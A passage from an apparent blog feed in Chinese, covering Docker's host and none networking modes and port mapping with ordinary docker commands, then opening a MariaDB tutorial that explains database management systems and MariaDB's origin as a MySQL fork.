host&#x4E3B;&#x673A;&#x7F51;&#x7EDC;</strong></p><p>&#x5982;&#x679C;&#x542F;&#x52A8;&#x5BB9;&#x5668;&#x7684;&#x65F6;&#x5019;&#x4F7F;&#x7528;host&#x6A21;&#x5F0F;&#xFF0C;&#x90A3;&#x4E48;&#x8FD9;&#x4E2A;&#x5BB9;&#x5668;&#x5C06;&#x4E0D;&#x4F1A;&#x83B7;&#x5F97;&#x4E00;&#x4E2A;&#x72EC;&#x7ACB;&#x7684;Network Namespace&#xFF0C;&#x800C;&#x662F;&#x548C;&#x5BBF;&#x4E3B;&#x673A;&#x5171;&#x7528;&#x4E00;&#x4E2A;Network Namespace&#x3002;&#x5BB9;&#x5668;&#x5C06;&#x4E0D;&#x4F1A;&#x865A;&#x62DF;&#x51FA;&#x81EA;&#x5DF1;&#x7684;&#x7F51;&#x5361;&#xFF0C;&#x914D;&#x7F6E;&#x81EA;&#x5DF1;&#x7684;IP&#x7B49;&#xFF0C;&#x800C;&#x662F;&#x4F7F;&#x7528;&#x5BBF;&#x4E3B;&#x673A;&#x7684;IP&#x548C;&#x7AEF;&#x53E3;&#x3002;&#x4F46;&#x662F;&#xFF0C;&#x5BB9;&#x5668;&#x7684;&#x5176;&#x4ED6;&#x65B9;&#x9762;&#xFF0C;&#x5982;&#x6587;&#x4EF6;&#x7CFB;&#x7EDF;&#x3001;&#x8FDB;&#x7A0B;&#x5217;&#x8868;&#x7B49;&#x8FD8;&#x662F;&#x548C;&#x5BBF;&#x4E3B;&#x673A;&#x9694;&#x79BB;&#x7684;&#x3002;&#x53EA;&#x7528;&#x8FD9;&#x79CD;&#x7F51;&#x7EDC;&#x7684;&#x5BB9;&#x5668;&#x4F1A;&#x4F7F;&#x7528;&#x4E3B;&#x673A;&#x7684;&#x7F51;&#x7EDC;&#xFF0C;&#x8FD9;&#x79CD;&#x7F51;&#x7EDC;&#x5BF9;&#x5916;&#x754C;&#x662F;&#x5B8C;&#x5168;&#x5F00;&#x653E;&#x7684;&#xFF0C;&#x80FD;&#x591F;&#x8BBF;&#x95EE;&#x5230;&#x4E3B;&#x673A;&#xFF0C;&#x5C31;&#x80FD;&#x8BBF;&#x95EE;&#x5230;&#x5BB9;&#x5668;&#x3002;</p><p><strong>4.3 &#x4F7F;&#x7528;none&#x6A21;&#x5F0F;</strong></p><p>Docker&#x5BB9;&#x5668;&#x62E5;&#x6709;&#x81EA;&#x5DF1;&#x7684;Network Namespace&#xFF0C;&#x4F46;&#x662F;&#xFF0C;&#x5E76;&#x4E0D;&#x4E3A;Docker&#x5BB9;&#x5668;&#x8FDB;&#x884C;&#x4EFB;&#x4F55;&#x7F51;&#x7EDC;&#x914D;&#x7F6E;&#x3002;&#x4E5F;&#x5C31;&#x662F;&#x8BF4;&#xFF0C;&#x8FD9;&#x4E2A;Docker&#x5BB9;&#x5668;&#x6CA1;&#x6709;&#x7F51;&#x5361;&#x3001;IP&#x3001;&#x8DEF;&#x7531;&#x7B49;&#x4FE1;&#x606F;&#x3002;&#x9700;&#x8981;&#x6211;&#x4EEC;&#x81EA;&#x5DF1;&#x4E3A;Docker&#x5BB9;&#x5668;&#x6DFB;&#x52A0;&#x7F51;&#x5361;&#x3001;&#x914D;&#x7F6E;IP&#x7B49;&#x3002;&#x4F7F;&#x7528;&#x6B64;&#x79CD;&#x7F51;&#x7EDC;&#x7684;&#x5BB9;&#x5668;&#x4F1A;&#x5B8C;&#x5168;&#x9694;&#x79BB;&#x3002;</p><p><strong>4.4 &#x7B80;&#x5355;&#x6F14;&#x793A;</strong></p><figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">for i in `docker ps | grep -v &quot;CONTAINER&quot; | awk &apos;{print $1}&apos;`; do docker inspect $i | grep &apos;IPAddress&apos;; done</span><br></pre></td></tr></tbody></table></figure><p>&#x67E5;&#x770B;&#x6865;&#x63A5;&#x6A21;&#x5F0F;&#x4E0B;&#x4E3B;&#x673A;&#x5185;&#x90E8;&#x5BB9;&#x5668;&#x4E4B;&#x95F4;&#x548C;&#x5BB9;&#x5668;&#x4E0E;&#x5BBF;&#x4E3B;&#x673A;&#x76F4;&#x63A5;&#x5747;&#x53EF;&#x6B63;&#x5E38;&#x901A;&#x4FE1;</p><figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker inspect &#x5BB9;&#x5668;ID</span><br></pre></td></tr></tbody></table></figure><p>&#x67E5;&#x770B;host&#x521B;&#x5EFA;&#x7684;&#x5BB9;&#x5668;&#x5185;&#x90E8;&#x6CA1;&#x6709;IP&#x5730;&#x5740;&#xFF0C;&#x5B83;&#x4F7F;&#x7528;&#x7684;&#x4E3A;&#x5BBF;&#x4E3B;&#x673A;&#x7684;&#x5730;&#x5740;</p><figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -d --new host docker.io/sergeyzh/centos-nginx</span><br></pre></td></tr></tbody></table></figure><p>&#x67E5;&#x770B;host&#x521B;&#x5EFA;&#x7684;&#x5BB9;&#x5668;&#x5185;&#x90E8;&#x6CA1;&#x6709;IP&#x5730;&#x5740;&#xFF0C;&#x5B83;&#x4F7F;&#x7528;&#x7684;&#x4E3A;&#x5BBF;&#x4E3B;&#x673A;&#x7684;&#x5730;&#x5740;</p><figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -d --new none docker.io/sergeyzh/centos-nginx</span><br></pre></td></tr></tbody></table></figure><p><strong>4.5 &#x5BB9;&#x5668;&#x7AEF;&#x53E3;</strong></p><p>&#x5982;&#x679C;&#x60F3;&#x8BA9;&#x5916;&#x754C;&#x53EF;&#x4EE5;&#x8BBF;&#x95EE;&#x5230;&#xFF0C;&#x57FA;&#x4E8E;bridge&#x7F51;&#x7EDC;&#x521B;&#x5EFA;&#x7684;&#x5BB9;&#x5668;&#x63D0;&#x4F9B;&#x7684;&#x670D;&#x52A1;&#xFF0C;&#x90A3;&#x4F60;&#x53EF;&#x4EE5;&#x544A;&#x8BC9;Docker&#x4F60;&#x8981;&#x4F7F;&#x7528;&#x54EA;&#x4E9B;&#x63A5;&#x53E3;&#x3002;&#x5982;&#x679C;&#x60F3;&#x67E5;&#x770B;&#x955C;&#x50CF;&#x4F1A;&#x4F7F;&#x7528;&#x54EA;&#x4E9B;&#x7AEF;&#x53E3;&#xFF0C;ExposedPorts&#xFF0C;&#x53EF;&#x4EE5;&#x83B7;&#x6089;&#x955C;&#x50CF;&#x4F7F;&#x7528;&#x54EA;&#x4E9B;&#x7AEF;&#x53E3;&#x3002;</p><figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">docker run -d -p 80 docker.io/sergeyzh/centos-nginx</span><br><span class="line">docker port 09648b2ff7f6</span><br></pre></td></tr></tbody></table></figure><p><code>-p</code> &#x53C2;&#x6570;&#x4F1A;&#x5728;&#x5BBF;&#x4E3B;&#x673A;&#x968F;&#x673A;&#x6620;&#x5C04;&#x4E00;&#x4E2A;&#x9AD8;&#x7AEF;&#x53E3;&#x5230;&#x5BB9;&#x5668;&#x5185;&#x7684;&#x6307;&#x5B9A;&#x7AEF;&#x53E3;</p><figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -d -p 80:80 docker.io/sergeyzh/centos6-nginx  #&#x5C06;&#x5BBF;&#x4E3B;&#x673A;&#x7684;80&#x7AEF;&#x53E3;&#x6620;&#x5C04;&#x5230;&#x5BB9;&#x5668;&#x7684;80&#x7AEF;&#x53E3;</span><br></pre></td></tr></tbody></table></figure><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;容器Docker详解&quot;&gt;&lt;a href=&quot;#容器Docker详解&quot; class=&quot;headerlink&quot; title=&quot;容器Docker详解&quot;&gt;&lt;/a&gt;容器Docker详解&lt;/h1&gt;&lt;h2 id=&quot;概述&quot;&gt;&lt;a href=&quot;#概述&quot; class=&quot;headerlink&quot; title=&quot;概述&quot;&gt;&lt;/a&gt;概述&lt;/h2&gt;&lt;p&gt;&lt;strong&gt;1.1 基本概念：&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;Docker是一个开源的应用容器引擎，基于Go语言 并遵从Apache2.0协议开源。Docker可以让开发者打包他们的应用以及依赖包到一个轻量级、可移植的容器中，然后发布到任何流行的Linux机器上，也可以实现虚拟化。容器是完全使用沙箱机制，相互之间不会有任何接口（类似iPhone的app），更重要的的是容器性能开销极低。&lt;br&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>MariaDB</title>
    <link href="https://marnm.github.io//posts/fbf617b4/"/>
    <id>https://marnm.github.io//posts/fbf617b4/</id>
    <published>2022-06-07T05:16:21.000Z</published>
    <updated>2022-06-07T05:26:37.960Z</updated>
    
    <content type="html"><![CDATA[<h2 id="&#x7AE0;&#x8282;&#x7B80;&#x8FF0;"><a href="#&#x7AE0;&#x8282;&#x7B80;&#x8FF0;" class="headerlink" title="&#x7AE0;&#x8282;&#x7B80;&#x8FF0;"></a>&#x7AE0;&#x8282;&#x7B80;&#x8FF0;</h2><p>MySQL&#x6570;&#x636E;&#x5E93;&#x9879;&#x76EE;&#x81EA;&#x4ECE;&#x88AB;Oracle&#x516C;&#x53F8;&#x6536;&#x8D2D;&#x4E4B;&#x540E;&#xFF0C;&#x4ECE;&#x5F00;&#x6E90;&#x8F6F;&#x4EF6;&#x8F6C;&#x53D8;&#x6210;&#x4E3A;&#x4E86;&#x201C;&#x95ED;&#x6E90;&#x201D;&#x8F6F;&#x4EF6;&#xFF0C;&#x8FD9;&#x5BFC;&#x81F4;IT&#x884C;&#x4E1A;&#x4E2D;&#x7684;&#x5F88;&#x591A;&#x4F01;&#x4E1A;&#x4EE5;&#x53CA;&#x5382;&#x5546;&#x7EB7;&#x7EB7;&#x9009;&#x62E9;&#x4F7F;&#x7528;&#x4E86;&#x6570;&#x636E;&#x5E93;&#x8F6F;&#x4EF6;&#x7684;&#x540E;&#x8D77;&#x4E4B;&#x79C0;&#x2014;MariaDB&#x6570;&#x636E;&#x5E93;&#x7BA1;&#x7406;&#x7CFB;&#x7EDF;&#x3002;MariaDB&#x6570;&#x636E;&#x5E93;&#x7BA1;&#x7406;&#x7CFB;&#x7EDF;&#x4E5F;&#x56E0;&#x6B64;&#x5FEB;&#x901F;&#x5360;&#x636E;&#x4E86;&#x5E02;&#x573A;&#x3002;<br>&#x672C;&#x7AE0;&#x5C06;&#x4ECB;&#x7ECD;&#x6570;&#x636E;&#x5E93;&#x4EE5;&#x53CA;&#x6570;&#x636E;&#x5E93;&#x7BA1;&#x7406;&#x7CFB;&#x7EDF;&#x7684;&#x7406;&#x8BBA;&#x77E5;&#x8BC6;&#xFF0C;&#x7136;&#x540E;&#x518D;&#x4ECB;&#x7ECD;MariaDB&#x6570;&#x636E;&#x5E93;&#x7BA1;&#x7406;&#x7CFB;&#x7EDF;&#x7684;&#x5185;&#x5BB9;&#xFF0C;&#x6700;&#x540E;&#x5C06;&#x901A;&#x8FC7;&#x52A8;&#x624B;&#x5B9E;&#x9A8C;&#x7684;&#x65B9;&#x5F0F;&#xFF0C;&#x5E2E;&#x52A9;&#x5404;&#x4F4D;&#x8BFB;&#x8005;&#x638C;&#x63E1;MariaDB&#x6570;&#x636E;&#x5E93;&#x7BA1;&#x7406;&#x7CFB;&#x7EDF;&#x7684;&#x4E00;&#x4E9B;&#x5E38;&#x89C4;&#x64CD;&#x4F5C;&#x3002;&#x6BD4;&#x5982;&#xFF0C;&#x8D26;&#x6237;&#x7684;&#x521B;&#x5EFA;&#x4E0E;&#x7BA1;&#x7406;&#x3001;&#x8D26;&#x6237;&#x6743;&#x9650;&#x7684;&#x6388;&#x6743;&#xFF1B;&#x65B0;&#x5EFA;&#x6570;&#x636E;&#x5E93;&#x3001;&#x65B0;&#x5EFA;&#x6570;&#x636E;&#x5E93;&#x8868;&#x5355;&#xFF1B;&#x5BF9;&#x6570;&#x636E;&#x5E93;&#x6267;&#x884C;&#x65B0;&#x5EFA;&#x3001;&#x5220;&#x9664;&#x3001;&#x4FEE;&#x6539;&#x548C;&#x67E5;&#x8BE2;&#x7B49;&#x64CD;&#x4F5C;&#x3002;&#x672C;&#x7AE0;&#x6700;&#x540E;&#x8FD8;&#x4ECB;&#x7ECD;&#x4E86;&#x6570;&#x636E;&#x5E93;&#x7684;&#x5907;&#x4EFD;&#x4E0E;&#x6062;&#x590D;&#x65B9;&#x6CD5;&#x3002;<br>&#x5728;&#x5B66;&#x5B8C;&#x672C;&#x7AE0;&#x5185;&#x5BB9;&#x4E4B;&#x540E;&#xFF0C;&#x4E0D;&#x4F46;&#x53EF;&#x4EE5;&#x80DC;&#x4EFB;&#x751F;&#x4EA7;&#x73AF;&#x5883;&#x4E2D;&#x7684;&#x6570;&#x636E;&#x5E93;&#x7BA1;&#x7406;&#x5DE5;&#x4F5C;&#x3002;</p><h2 id="1-&#x6570;&#x636E;&#x5E93;&#x7BA1;&#x7406;&#x7CFB;&#x7EDF;"><a href="#1-&#x6570;&#x636E;&#x5E93;&#x7BA1;&#x7406;&#x7CFB;&#x7EDF;" class="headerlink" title="1 &#x6570;&#x636E;&#x5E93;&#x7BA1;&#x7406;&#x7CFB;&#x7EDF;"></a>1 &#x6570;&#x636E;&#x5E93;&#x7BA1;&#x7406;&#x7CFB;&#x7EDF;</h2><p>&#x6570;&#x636E;&#x5E93;&#x662F;&#x6307;&#x6309;&#x7167;&#x67D0;&#x4E9B;&#x7279;&#x5B9A;&#x7ED3;&#x6784;&#x6765;&#x5B58;&#x50A8;&#x6570;&#x636E;&#x8D44;&#x6599;&#x7684;&#x6570;&#x636E;&#x4ED3;&#x5E93;&#x3002;&#x5728;&#x5F53;&#x4ECA;&#x8FD9;&#x4E2A;&#x5927;&#x6570;&#x636E;&#x6280;&#x672F;&#x8FC5;&#x901F;&#x5D1B;&#x8D77;&#x7684;&#x5E74;&#x4EE3;&#xFF0C;&#x4E92;&#x8054;&#x7F51;&#x4E0A;&#x6BCF;&#x5929;&#x90FD;&#x4F1A;&#x751F;&#x6210;&#x6D77;&#x91CF;&#x7684;&#x6570;&#x636E;&#x4FE1;&#x606F;&#xFF0C;&#x6570;&#x636E;&#x5E93;&#x6280;&#x672F;&#x4E5F;&#x4ECE;&#x6700;&#x521D;&#x53EA;&#x80FD;&#x5B58;&#x50A8;&#x7B80;&#x5355;&#x7684;&#x8868;&#x683C;&#x6570;&#x636E;&#x7684;&#x5355;&#x4E00;&#x96C6;&#x4E2D;&#x5B58;&#x50A8;&#x6A21;&#x5F0F;&#xFF0C;&#x53D1;&#x5C55;&#x5230;&#x4E86;&#x73B0;&#x5982;&#x4ECA;&#x5B58;&#x50A8;&#x6D77;&#x91CF;&#x6570;&#x636E;&#x7684;&#x5927;&#x578B;&#x5206;&#x5E03;&#x5F0F;&#x6A21;&#x5F0F;&#x3002;&#x5728;&#x4FE1;&#x606F;&#x5316;&#x793E;&#x4F1A;&#x4E2D;&#xFF0C;&#x80FD;&#x591F;&#x5145;&#x5206;&#x6709;&#x6548;&#x5730;&#x7BA1;&#x7406;&#x548C;&#x5229;&#x7528;&#x5404;&#x79CD;&#x6570;&#x636E;&#xFF0C;&#x6316;&#x6398;&#x5176;&#x4E2D;&#x7684;&#x4EF7;&#x503C;&#xFF0C;&#x662F;&#x8FDB;&#x884C;&#x79D1;&#x5B66;&#x7814;&#x7A76;&#x4E0E;&#x51B3;&#x7B56;&#x7BA1;&#x7406;&#x7684;&#x91CD;&#x8981;&#x524D;&#x63D0;&#x3002;&#x540C;&#x65F6;&#xFF0C;&#x6570;&#x636E;&#x5E93;&#x6280;&#x672F;&#x4E5F;&#x662F;&#x7BA1;&#x7406;&#x4FE1;&#x606F;&#x7CFB;&#x7EDF;&#x3001;&#x529E;&#x516C;&#x81EA;&#x52A8;&#x5316;&#x7CFB;&#x7EDF;&#x3001;&#x51B3;&#x7B56;&#x652F;&#x6301;&#x7CFB;&#x7EDF;&#x7B49;&#x5404;&#x7C7B;&#x4FE1;&#x606F;&#x7CFB;&#x7EDF;&#x7684;&#x6838;&#x5FC3;&#x7EC4;&#x6210;&#x90E8;&#x5206;&#xFF0C;&#x662F;&#x8FDB;&#x884C;&#x79D1;&#x5B66;&#x7814;&#x7A76;&#x548C;&#x51B3;&#x7B56;&#x7BA1;&#x7406;&#x7684;&#x91CD;&#x8981;&#x6280;&#x672F;&#x624B;&#x6BB5;&#x3002;<br>&#x6570;&#x636E;&#x5E93;&#x7BA1;&#x7406;&#x7CFB;&#x7EDF;&#x662F;&#x4E00;&#x79CD;&#x80FD;&#x591F;&#x5BF9;&#x6570;&#x636E;&#x5E93;&#x4E2D;&#x5B58;&#x653E;&#x7684;&#x6570;&#x636E;&#x8FDB;&#x884C;&#x5EFA;&#x7ACB;&#x3001;&#x4FEE;&#x6539;&#x3001;&#x5220;&#x9664;&#x3001;&#x67E5;&#x627E;&#x3001;&#x7EF4;&#x62A4;&#x7B49;&#x64CD;&#x4F5C;&#x7684;&#x8F6F;&#x4EF6;&#x7A0B;&#x5E8F;&#x3002;&#x5B83;&#x901A;&#x8FC7;&#x628A;&#x8BA1;&#x7B97;&#x673A;&#x4E2D;&#x5177;&#x4F53;&#x7684;&#x7269;&#x7406;&#x6570;&#x636E;&#x8F6C;&#x6362;&#x6210;&#x9002;&#x5408;&#x7528;&#x6237;&#x7406;&#x89E3;&#x7684;&#x62BD;&#x8C61;&#x903B;&#x8F91;&#x6570;&#x636E;&#xFF0C;&#x6709;&#x6548;&#x5730;&#x964D;&#x4F4E;&#x6570;&#x636E;&#x5E93;&#x7BA1;&#x7406;&#x7684;&#x6280;&#x672F;&#x95E8;&#x69DB;&#xFF0C;&#x56E0;&#x6B64;&#x5373;&#x4FBF;&#x662F;&#x4ECE;&#x4E8B;Linux&#x8FD0;&#x7EF4;&#x5DE5;&#x4F5C;&#x7684;&#x5DE5;&#x7A0B;&#x5E08;&#x4E5F;&#x53EF;&#x4EE5;&#x5BF9;&#x6570;&#x636E;&#x5E93;&#x8FDB;&#x884C;&#x57FA;&#x672C;&#x7684;&#x7BA1;&#x7406;&#x64CD;&#x4F5C;&#x3002;&#x4F46;&#x662F;&#xFF0C;&#x8001;&#x5E08;&#x6709;&#x5FC5;&#x8981;&#x63D0;&#x9192;&#x5404;&#x4F4D;&#x8BFB;&#x8005;&#xFF0C;&#x672C;&#x8BFE;&#x7A0B;&#x7684;&#x6280;&#x672F;&#x4E3B;&#x7EBF;&#x4F9D;&#x7136;&#x662F;Linux&#x7CFB;&#x7EDF;&#x7684;&#x8FD0;&#x7EF4;&#xFF0C;&#x800C;&#x6570;&#x636E;&#x5E93;&#x7BA1;&#x7406;&#x7CFB;&#x7EDF;&#x53EA;&#x4E0D;&#x8FC7;&#x662F;&#x5728;&#x6B64;&#x4E3B;&#x7EBF;&#x4E0A;&#x7684;&#x4E00;&#x4E2A;&#x5185;&#x5BB9;&#x4E0D;&#x65AD;&#x6A2A;&#x5411;&#x6269;&#x5C55;&#x3001;&#x7EB5;&#x5411;&#x52A0;&#x6DF1;&#x7684;&#x5206;&#x652F;&#xFF0C;&#x4E0D;&#x80FD;&#x6307;&#x671B;&#x5728;&#x4E00;&#x4E24;&#x5929;&#x4E4B;&#x5185;&#x5C31;&#x53EF;&#x4EE5;&#x7CBE;&#x901A;&#x6570;&#x636E;&#x5E93;&#x7BA1;&#x7406;&#x6280;&#x672F;&#x3002;&#x5982;&#x679C;&#x6709;&#x540C;&#x5B66;&#x5728;&#x5B66;&#x5B8C;&#x672C;&#x8BFE;&#x7A0B;&#x5185;&#x5BB9;&#x4E4B;&#x540E;&#x5BF9;&#x6570;&#x636E;&#x5E93;&#x7BA1;&#x7406;&#x6280;&#x672F;&#x4EA7;&#x751F;&#x4E86;&#x6D53;&#x539A;&#x5174;&#x8DA3;&#xFF0C;&#x5E76;&#x5E0C;&#x671B;&#x8C0B;&#x5F97;&#x4E00;&#x4EFD;&#x76F8;&#x5173;&#x7684;&#x5DE5;&#x4F5C;&#xFF0C;&#x90A3;&#x4E48;&#x5C31;&#x9700;&#x8981;&#x989D;&#x5916;&#x4E3A;&#x81EA;&#x5DF1;&#x5B9A;&#x5236;&#x4E00;&#x4E2A;&#x5B66;&#x4E60;&#x89C4;&#x5212;&#x4E86;&#x3002;</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="sql.png" alt="mariadbmysql" title="">                </div>                <div class="image-caption">mariadbmysql</div>            </figure><p>&#x56FE;1 MariaDB&#x4E0E;Mysql&#x6570;&#x636E;&#x5E93;&#x7BA1;&#x7406;&#x7CFB;&#x7EDF;&#x8457;&#x540D;LOGO</p><p>&#x65E2;&#x7136;&#x662F;&#x8BB2;&#x89E3;&#x6570;&#x636E;&#x5E93;&#x7BA1;&#x7406;&#x6280;&#x672F;&#xFF0C;&#x5C31;&#x80AF;&#x5B9A;&#x7ED5;&#x4E0D;&#x5F00;MySQL&#x3002;MySQL&#x662F;&#x4E00;&#x6B3E;&#x5E02;&#x573A;&#x5360;&#x6709;&#x7387;&#x975E;&#x5E38;&#x9AD8;&#x7684;&#x6570;&#x636E;&#x5E93;&#x7BA1;&#x7406;&#x7CFB;&#x7EDF;&#xFF0C;&#x6280;&#x672F;&#x6210;&#x719F;&#x3001;&#x914D;&#x7F6E;&#x6B65;&#x9AA4;&#x76F8;&#x5BF9;&#x7B80;&#x5355;&#xFF0C;&#x800C;&#x4E14;&#x5177;&#x6709;&#x826F;&#x597D;&#x7684;&#x53EF;&#x6269;&#x5C55;&#x6027;&#x3002;&#x4F46;&#x662F;&#xFF0C;&#x7531;&#x4E8E;Oracle&#x516C;&#x53F8;&#x5728;2009&#x5E74;&#x6536;&#x8D2D;&#x4E86;MySQL&#x7684;&#x6BCD;&#x516C;&#x53F8;Sun&#xFF0C;&#x56E0;&#x6B64;MySQL&#x6570;&#x636E;&#x5E93;&#x9879;&#x76EE;&#x4E5F;&#x968F;&#x4E4B;&#x7EB3;&#x5165;Oracle&#x9EBE;&#x4E0B;&#xFF0C;&#x9010;&#x6B65;&#x6F14;&#x53D8;&#x4E3A;&#x4FDD;&#x6301;&#x7740;&#x5F00;&#x6E90;&#x8F6F;&#x4EF6;&#x7684;&#x8EAB;&#x4EFD;&#xFF0C;&#x4F46;&#x53C8;&#x7533;&#x8BF7;&#x4E86;&#x591A;&#x9879;&#x5546;&#x4E1A;&#x4E13;&#x5229;&#x7684;&#x8F6F;&#x4EF6;&#x7CFB;&#x7EDF;&#x3002;&#x5F00;&#x6E90;&#x8F6F;&#x4EF6;&#x662F;&#x5168;&#x7403;&#x9ED1;&#x5BA2;&#x3001;&#x6781;&#x5BA2;&#x3001;&#x7A0B;&#x5E8F;&#x5458;&#x7B49;&#x6280;&#x672F;&#x9AD8;&#x624B;&#x5728;&#x5F00;&#x6E90;&#x793E;&#x533A;&#x7684;&#x5927;&#x65D7;&#x4E0B;&#x7684;&#x516C;&#x5171;&#x667A;&#x6167;&#x7ED3;&#x6676;&#xFF0C;&#x81EA;&#x5DF1;&#x7684;&#x52B3;&#x52A8;&#x6210;&#x679C;&#x88AB;&#x5176;&#x4ED6;&#x516C;&#x53F8;&#x5546;&#x4E1A;&#x5316;&#x81EA;&#x7136;&#x4E5F;&#x4F24;&#x4E86;&#x4E00;&#x5927;&#x6279;&#x5F00;&#x6E90;&#x5DE5;&#x4F5C;&#x8005;&#x7684;&#x5FC3;&#xFF0C;&#x56E0;&#x6B64;&#x7531;MySQL&#x9879;&#x76EE;&#x521B;&#x59CB;&#x8005;&#x91CD;&#x65B0;&#x7814;&#x53D1;&#x4E86;&#x4E00;&#x6B3E;&#x540D;&#x4E3A;MariaDB&#x7684;&#x5168;&#x65B0;&#x6570;&#x636E;&#x5E93;&#x7BA1;&#x7406;&#x7CFB;&#x7EDF;&#x3002;&#x8BE5;&#x8F6F;&#x4EF6;&#x5F53;&#x524D;&#x7531;&#x5F00;&#x6E90;&#x793E;&#x533A;&#x8FDB;&#x884C;&#x7EF4;&#x62A4;&#xFF0C;&#x662F;MySQL&#x7684;&#x5206;&#x652F;&#x4EA7;&#x54C1;&#xFF0C;&#x800C;&#x4E14;&#x51E0;&#x4E4E;&#x5B8C;&#x5168;&#x517C;&#x5BB9;MySQL&#x3002;<br>&#x4E0E;&#x6B64;&#x540C;&#x65F6;&#xFF0C;&#x7531;&#x4E8E;&#x5404;&#x5927;&#x516C;&#x53F8;&#x4E4B;&#x95F4;&#x5B58;&#x5728;&#x7740;&#x7ADE;&#x4E89;&#x5173;&#x7CFB;&#x6216;&#x5229;&#x76CA;&#x5173;&#x7CFB;&#xFF0C;&#x5916;&#x52A0;MySQL&#x5728;&#x88AB;&#x6536;&#x8D2D;&#x4E4B;&#x540E;&#x9010;&#x6E10;&#x7531;&#x5F00;&#x6E90;&#x5411;&#x95ED;&#x6E90;&#x8F6F;&#x4EF6;&#x8F6C;&#x53D8;&#xFF0C;&#x5F88;&#x591A;&#x516C;&#x53F8;&#x629B;&#x5F03;&#x4E86;MySQL&#x3002;&#x5F53;&#x524D;&#xFF0C;&#x8C37;&#x6B4C;&#x3001;&#x7EF4;&#x57FA;&#x767E;&#x79D1;&#x7B49;&#x6280;&#x672F;&#x9886;&#x57DF;&#x51B3;&#x5B9A;&#x5C06;MySQL&#x6570;&#x636E;&#x5E93;&#x4E0A;&#x7684;&#x4E1A;&#x52A1;&#x8F6C;&#x79FB;&#x5230;MariaDB&#x6570;&#x636E;&#x5E93;&#xFF0C;Linux&#x5F00;&#x6E90;&#x7CFB;&#x7EDF;&#x7684;&#x9886;&#x8896;&#x7EA2;&#x5E3D;&#x516C;&#x53F8;&#x4E5F;&#x51B3;&#x5B9A;&#x5728;RHEL 7&#x3001;CentOS 7&#x4EE5;&#x53CA;&#x6700;&#x65B0;&#x7684;Fedora&#x7CFB;&#x7EDF;&#x4E2D;&#xFF0C;&#x5C06;MariaDB&#x4F5C;&#x4E3A;&#x9ED8;&#x8BA4;&#x7684;&#x6570;&#x636E;&#x5E93;&#x7BA1;&#x7406;&#x7CFB;&#x7EDF;&#xFF0C;&#x800C;&#x4E14;&#x7EA2;&#x5E3D;&#x516C;&#x53F8;&#x66F4;&#x662F;&#x9996;&#x6B21;&#x5C06;&#x6570;&#x636E;&#x5E93;&#x77E5;&#x8BC6;&#x52A0;&#x5165;&#x5230;&#x4E86;RHCE&#x8BA4;&#x8BC1;&#x7684;&#x8003;&#x8BD5;&#x5185;&#x5BB9;&#x4E2D;&#x3002;&#x968F;&#x540E;&#xFF0C;&#x8FD8;&#x6709;&#x6570;&#x5341;&#x4E2A;&#x5E38;&#x89C1;&#x7684;Linux&#x7CFB;&#x7EDF;&#xFF08;&#x5982;openSUSE&#x3001;Slackware&#x7B49;&#xFF09;&#x4E5F;&#x4F5C;&#x51FA;&#x4E86;&#x540C;&#x6837;&#x7684;&#x8868;&#x6001;&#x3002;<br>&#x4F46;&#x662F;&#xFF0C;&#x5766;&#x767D;&#x6765;&#x8BB2;&#xFF0C;&#x867D;&#x7136;IT&#x884C;&#x4E1A;&#x5DE8;&#x5934;&#x90FD;&#x51B3;&#x5B9A;&#x91C7;&#x7528;MariaDB&#x6570;&#x636E;&#x5E93;&#x7BA1;&#x7CFB;&#x7EDF;&#xFF0C;&#x8FD9;&#x5E76;&#x4E0D;&#x610F;&#x5473;&#x7740;MariaDB&#x8F83;&#x4E4B;&#x4E8E;MySQL&#x6709;&#x660E;&#x663E;&#x7684;&#x4F18;&#x52BF;&#x3002;&#x8001;&#x5E08;&#x7528;&#x4E86;&#x8FD1;&#x4E24;&#x5468;&#x7684;&#x65F6;&#x95F4;&#x6D4B;&#x8BD5;&#x4E86;MariaDB&#x4E0E;MySQL&#x7684;&#x533A;&#x522B;&#xFF0C;&#x5E76;&#x8FDB;&#x884C;&#x4E86;&#x591A;&#x9879;&#x6027;&#x80FD;&#x6D4B;&#x8BD5;&#xFF0C;&#x5E76;&#x6CA1;&#x6709;&#x53D1;&#x73B0;&#x5A92;&#x4F53;&#x6240;&#x8BF4;&#x7684;&#x90A3;&#x79CD;&#x660E;&#x663E;&#x7684;&#x4F18;&#x52BF;&#x3002;&#x53EF;&#x4EE5;&#x8BF4;&#xFF0C;MariaDB&#x548C;MySQL&#x5728;&#x6027;&#x80FD;&#x4E0A;&#x57FA;&#x672C;&#x4FDD;&#x6301;&#x4E00;&#x81F4;&#xFF0C;&#x4E24;&#x8005;&#x7684;&#x64CD;&#x4F5C;&#x547D;&#x4EE4;&#x4E5F;&#x5341;&#x5206;&#x76F8;&#x4F3C;&#x3002;&#x4ECE;&#x52A1;&#x5B9E;&#x7684;&#x89D2;&#x5EA6;&#x6765;&#x8BB2;&#xFF0C;&#x5728;&#x638C;&#x63E1;&#x4E86;MariaDB&#x6570;&#x636E;&#x5E93;&#x7684;&#x547D;&#x4EE4;&#x548C;&#x57FA;&#x672C;&#x64CD;&#x4F5C;&#x4E4B;&#x540E;&#xFF0C;&#x5728;&#x4ECA;&#x540E;&#x7684;&#x5DE5;&#x4F5C;&#x4E2D;&#